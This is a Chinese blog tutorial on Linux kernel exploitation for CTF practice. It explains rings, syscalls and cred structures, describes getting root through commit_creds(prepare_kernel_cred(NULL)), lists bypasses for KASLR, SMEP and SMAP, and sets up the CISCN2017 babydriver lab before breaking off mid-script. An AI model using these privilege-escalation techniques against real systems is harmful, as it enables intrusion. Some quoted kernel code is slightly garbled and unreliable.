    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、内核"><a href="#一、内核" class="headerlink" title="一、内核"></a>一、内核</h3><p><strong>操作系统</strong>（Operation System）本质上就是一个管理着计算机硬件和软件资源并为计算机程序提供公共服务的系统软件，其主要功能就是调度系统资源、控制IO设备等等。Linux系统整体结构如下。</p><p><img src="https://i.loli.net/2021/10/22/rudK3BiUF9lAjeq.png"></p><p><strong>内核 （kernel）</strong>也是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p><p><img src="https://i.loli.net/2021/10/22/VmRZaEvJj1yNO7P.png"></p><p>kernel 最主要的功能有两点：</p><ol><li><strong>控制并与硬件进行交互</strong></li><li><strong>提供 application 能运行的环境</strong></li></ol><p>包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p><h3 id="二、分级保护域"><a href="#二、分级保护域" class="headerlink" title="二、分级保护域"></a>二、分级保护域</h3><p>intel CPU 将 CPU 的特权级别分为 4 个级别：<strong>Ring 0</strong>, Ring 1, Ring 2, <strong>Ring 3</strong>，权限等级以此降低。</p><p><img src="https://i.loli.net/2021/10/22/yLRf5Y2VaM6suqe.png" alt="image-20211022132633477"></p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p><strong>大多数的现代操作系统只使用了 Ring 0 和 Ring 3，其中 kernel 运行在 ring0，用户态程序运行在 ring3</strong></p><blockquote><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p></blockquote><h4 id="用户态和内核态"><a href="#用户态和内核态" class="headerlink" title="用户态和内核态"></a>用户态和内核态</h4><p><strong>当进程运行在内核空间时就处于内核态，运行在用户空间时则处于用户态</strong></p><p>在内核态下，进程运行在内核地址空间中，<strong>此时 CPU 可以执行任何指令</strong><br>在用户态下，进程运行在用户地址空间中，<strong>此时CPU所执行的指令是受限的</strong></p><h4 id="进程运行态切换"><a href="#进程运行态切换" class="headerlink" title="进程运行态切换"></a>进程运行态切换</h4><p>应用程式运行时总会经历无数次的用户态与内核态之间的转换，这是因为用户进程往往需要使用内核所提供的各种功能（如IO等），此时就需要陷入（trap）内核，待完成之后再“着陆”回用户态。</p><h5 id="用户态-gt-内核态"><a href="#用户态-gt-内核态" class="headerlink" title="用户态 -&gt; 内核态"></a>用户态 -&gt; 内核态</h5><p>当发生<strong>系统调用</strong>，<strong>产生异常</strong>，<strong>外设产生中断</strong>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ENTRY(entry_SYSCALL_64)<br> <span class="hljs-regexp">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br> SWAPGS_UNSAFE_STACK<br><br> <span class="hljs-regexp">/* 保存栈值，并设置内核栈 */</span><br> movq %rsp, PER_CPU_VAR(rsp_scratch)<br> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><br><br><span class="hljs-regexp">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="hljs-regexp">/* Construct struct pt_regs on stack */</span><br>pushq  <span class="hljs-variable">$__USER_DS</span>      <span class="hljs-regexp">/* pt_regs-&gt;ss */</span><br>pushq  PER_CPU_VAR(rsp_scratch)  <span class="hljs-regexp">/* pt_regs-&gt;sp */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;flags */</span><br>pushq  <span class="hljs-variable">$__USER_CS</span>      <span class="hljs-regexp">/* pt_regs-&gt;cs */</span><br>pushq  %rcx             <span class="hljs-regexp">/* pt_regs-&gt;ip */</span><br>pushq  %rax             <span class="hljs-regexp">/* pt_regs-&gt;orig_ax */</span><br>pushq  %rdi             <span class="hljs-regexp">/* pt_regs-&gt;di */</span><br>pushq  %rsi             <span class="hljs-regexp">/* pt_regs-&gt;si */</span><br>pushq  %rdx             <span class="hljs-regexp">/* pt_regs-&gt;dx */</span><br>pushq  %rcx tuichu    <span class="hljs-regexp">/* pt_regs-&gt;cx */</span><br>pushq  $-ENOSYS        <span class="hljs-regexp">/* pt_regs-&gt;ax */</span><br>pushq  %r8              <span class="hljs-regexp">/* pt_regs-&gt;r8 */</span><br>pushq  %r9              <span class="hljs-regexp">/* pt_regs-&gt;r9 */</span><br>pushq  %r10             <span class="hljs-regexp">/* pt_regs-&gt;r10 */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;r11 */</span><br>sub $(<span class="hljs-number">6</span>*<span class="hljs-number">8</span>), %rsp      <span class="hljs-regexp">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></code></pre></td></tr></table></figure><ol start="4"><li>通过汇编指令判断是否为 <code>x32_abi</code>。</li><li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> （保存着系统调用的函数指针）相应位置继续执行系统调用。</li></ol><h5 id="内核态-gt-用户态"><a href="#内核态-gt-用户态" class="headerlink" title="内核态 -&gt; 用户态"></a>内核态 -&gt; 用户态</h5><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><h3 id="三、系统调用"><a href="#三、系统调用" class="headerlink" title="三、系统调用"></a>三、系统调用</h3><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p><blockquote><p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p></blockquote><p>使用系统调用时会<strong>陷入内核态，接着由操作系统完成请求</strong></p><p>系统调用本质上与一般的C库函数没有区别，不同的是系统调用位于内核空间，以内核态运行</p><h4 id="进入系统调用"><a href="#进入系统调用" class="headerlink" title="进入系统调用"></a>进入系统调用</h4><p>Linux 下进入系统调用有两种主要的方式：</p><ul><li>32位：执行 <code>int 0x80 </code>汇编指令（80号中断）</li><li>64位：执行 <code>syscall</code> 汇编指令 / 执行 <code>sysenter</code> 汇编指令（only intel）</li></ul><p>接下来就是由用户态进入到内核态的流程</p><p>Linux下的系统调用以<code>eax/rax</code>寄存器作为<strong>系统调用号</strong>，参数传递约束如下：</p><ul><li>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</li><li>64 位：<code>rdi、rsi、rdx、rcx、r8、r9</code>作为第一个参数、第二个参数…进行参数传递</li></ul><h4 id="退出系统调用"><a href="#退出系统调用" class="headerlink" title="退出系统调用"></a>退出系统调用</h4><p>同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：</p><ul><li>执行<code>iret</code>汇编指令</li><li>执行 <code>sysret</code> 汇编指令 / 执行<code>sysexit</code>汇编指令（only Intel）</li></ul><p>接下来就是由内核态回退至用户态的流程</p><h3 id="四、进程权限管理"><a href="#四、进程权限管理" class="headerlink" title="四、进程权限管理"></a>四、进程权限管理</h3><h4 id="进程描述符"><a href="#进程描述符" class="headerlink" title="进程描述符"></a>进程描述符</h4><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// [include/linux/sched.h]</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">long</span> state;            <span class="hljs-comment">// process state (running, stopped, ...)</span><br>    <span class="hljs-keyword">void</span> *<span class="hljs-built_in">stack</span>;                    <span class="hljs-comment">// task&#x27;s stack pointer</span><br>    <span class="hljs-keyword">int</span> prio;                       <span class="hljs-comment">// process priority</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// memory address space</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> *<span class="hljs-title">files</span>;</span>     <span class="hljs-comment">// open file information</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span>        <span class="hljs-comment">// credentials</span><br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>进程，线程和内核线程都是使用这个task_struct结构体，在内核中最终都会调用do_fork()函数。</p><p><img src="https://i.loli.net/2021/10/22/D9NyjqhiaSnsb6L.png" alt="image-20211022134908132"></p><h4 id="进程权限凭证"><a href="#进程权限凭证" class="headerlink" title="进程权限凭证"></a>进程权限凭证</h4><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。该结构定义在<code>include/linux/cred.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-keyword">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-keyword">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-keyword">void</span>        *put_addr;<br>    <span class="hljs-keyword">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-keyword">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-keyword">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-keyword">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-keyword">void</span>        *security;  <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中：</p><ul><li><p><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></p></li><li><p><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</p></li></ul><p>查看<code>prepare_kernel_cred()</code>函数源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct cred *<span class="hljs-title">prepare_kernel_cred</span><span class="hljs-params">(struct task_struct *daemon)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span>;</span><br><br><span class="hljs-keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>kdebug(<span class="hljs-string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="hljs-keyword">new</span>);<br><br><span class="hljs-keyword">if</span> (daemon)<br>old = get_task_cred(daemon);<br><span class="hljs-keyword">else</span><br>old = get_cred(&amp;init_cred);<br>...<br></code></pre></td></tr></table></figure><p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p><p>那么我们不难想到，只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code>，再运行一个system(“/bin/sh”)就能拿到root的shell了。</p><h3 id="五、可装载内核模块（LKM）"><a href="#五、可装载内核模块（LKM）" class="headerlink" title="五、可装载内核模块（LKM）"></a>五、可装载内核模块（LKM）</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><p>模块的编译需要用到Makefile，通常与LKM相关的命令有以下三个：</p><ul><li><code>lsmod</code>：列出现有的LKMs</li><li><code>insmod</code>：装载新的LKM（需要root）</li><li><code>rmmod</code>：从内核中移除LKM（需要root）</li></ul><h3 id="六、保护机制"><a href="#六、保护机制" class="headerlink" title="六、保护机制"></a>六、保护机制</h3><p>跟用户程序类似，内核也会有各种各样的保护机制</p><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似——在内核镜像映射到实际的地址空间时加上一个偏移值，但是内核内部的相对偏移其实还是不变的</p><p>在未开启KASLR保护机制时，内核的基址为<code>0xffffffff81000000</code></p><p>像用户空间的绕过手法一样，可以通过leak memory来bypass</p><h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），用以阻止<strong>内核空间直接执行用户空间的数据</strong>。CR4寄存器的第20位标志着是否开启这个保护。</p><p><img src="https://i.loli.net/2021/10/22/w3SYbNiIB452d1Q.png"></p><p><img src="https://i.loli.net/2021/10/22/Kqyt6GzTJVahiYp.png"></p><p>绕过方法：</p><ul><li>kernel ROP</li><li>修改addr_limit，set_fs(-1)（addr_limit用于限制用户态程序能访问的地址的最大值，通过set_fs可以改变thread_info-&gt;addr_limit的大小，如果把它修改成 <code>0xffffffffffffffff</code> ，我们就可以读写整个内存空间了 包括 <strong>内核空间</strong>）</li><li>ret2dir，在设计中，为了使隔离的数据进行交换时具有更高的性能，隐性地址共享始终存在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐性内存共享可以完整的绕过软件和硬件的隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mapped memory ）</li></ul><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>SMAP即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），用以阻止<strong>内核空间直接访问用户空间的数据</strong>。CR4寄存器的第21位标志着是否开启这个保护。</p><p><img src="https://i.loli.net/2021/10/22/A8sRhlYOMNUeSy3.png"></p><p><img src="https://i.loli.net/2021/10/22/Kqyt6GzTJVahiYp.png"></p><p>绕过方法（较为苛刻）：</p><ul><li>ret2dir</li><li>ksma</li><li>modprobe_path</li></ul><h4 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h4><p>KPTI即<code>内核页表隔离</code>（Kernel page-table isolation）,内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化</p><p><img src="https://i.loli.net/2021/10/22/8mokKdw7JE1YCHt.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里全程以<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver">CISCN2017 - babydriver</a>的环境搭建作为演示</p><h3 id="一、编译内核"><a href="#一、编译内核" class="headerlink" title="一、编译内核"></a>一、编译内核</h3><p>首先到linux内核的<a href="https://www.kernel.org/">官网</a>下载一份内核源代码并解压:</p><p><img src="https://i.loli.net/2021/10/22/IJEA2BLK3slYPet.png"></p><p>我下载的<a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz">4.4.72</a>的内核版本</p><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xvf linux-4.4.72.tar.gz<br></code></pre></td></tr></table></figure><p>安装一些环境依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils qemu flex libncurses5-dev fakeroot build-essential ncurses-dev xz-utils libssl-dev bc bison libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev libelf-dev<br></code></pre></td></tr></table></figure><p>这些依赖并不一定全部概况完了,在编译的过程中可能在报错信息中还要提示你安装一些依赖,具体根据报错提示再进行安装就可以</p><p>然后进入解压目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd linux-4.4.72/<br>make menuconfig<br></code></pre></td></tr></table></figure><p>一般默认就可以直接退出保存，运行如下命令开始编译，生成内核镜像（可以<code>nproc</code>查看本机CPU核数）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -j12 bzImage<br></code></pre></td></tr></table></figure><p>完成之后有如下信息</p><p><img src="https://i.loli.net/2021/10/22/QvOFBlxAWTVMeC5.png"></p><p>在当前目录下提取到<code>vmlinux</code>，为编译出来的原始内核文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">file vmlinux<br>vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=56951e7dc9f45ad402bc9499e20cf1c050710dc8, not stripped<br></code></pre></td></tr></table></figure><p>在当前目录下的<code>arch/x86/boot/</code>目录下提取到<code>bzImage</code>，为压缩后的内核文件，适用于大内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">file arch/x86/boot/bzImage<br>arch/x86/boot/bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (verf1sh@ubuntu) #1 SMP Fri Oct 22 05:23:12 PDT 2021, RO-rootFS, swap_dev 0x6, Normal VGA<br></code></pre></td></tr></table></figure><h3 id="二、编译busybox构建文件系统"><a href="#二、编译busybox构建文件系统" class="headerlink" title="二、编译busybox构建文件系统"></a>二、编译busybox构建文件系统</h3><p>BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件，包含了例如ls、cat和echo等一些简单的工具</p><p>在<a href="https://busybox.net/downloads/">busybox.net</a>下载自己想要的版本，这里选用<code>busybox-1.33.0.tar.bz2</code>这个版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs she">cd ..<br>wget https://busybox.net/downloads/busybox-1.33.1.tar.bz2<br>tar -jxvf busybox-1.33.1.tar.bz2<br>cd busybox-1.33.1/<br>make menuconfig<br></code></pre></td></tr></table></figure><p>注意为了避免不必要的麻烦，这个选择静态编译</p><blockquote><p>Setting -&gt; Build Options -&gt; Build static binary (no shared libs)</p></blockquote><p><img src="https://i.loli.net/2021/10/22/V4zu2XcZKW9DhSQ.png"></p><p>保存后直接编译 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make install<br></code></pre></td></tr></table></figure><p>编译完make install后，在busybox源代码的根目录下会有一个 _install目录下会存放好编译后的文件</p><p><img src="https://i.loli.net/2021/10/22/YB4ZPL6srGtEV7D.png"></p><p>接下来一些初始化操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs she">cd _install<br>mkdir -pv &#123;bin,etc/init.d,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125; <br>touch etc/init.d/rcS<br>chmod +x ./etc/init.d/rcS<br></code></pre></td></tr></table></figure><p>配置etc/inttab，写入如下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">::sysinit:/etc/init.d/rcS<br>::askfirst:/bin/ash<br>::ctrlaltdel:/sbin/reboot<br>::shutdown:/sbin/swapoff -a<br>::shutdown:/bin/umount -a -r<br>::restart:/sbin/init<br></code></pre></td></tr></table></figure><p>在上面的文件中指定了系统初始化脚本，因此接下来配置<code>etc/init.d/rcS</code>，写入如下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc none /proc<br>mount -t sys none /sys<br>/bin/mount -n -t sysfs none /sys<br>/bin/mount -t ramfs none /dev<br>/sbin/mdev -s<br></code></pre></td></tr></table></figure><p>主要是配置各种目录的挂载</p><p>也可以在根目录下创建<code>init</code>文件，写入如下内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 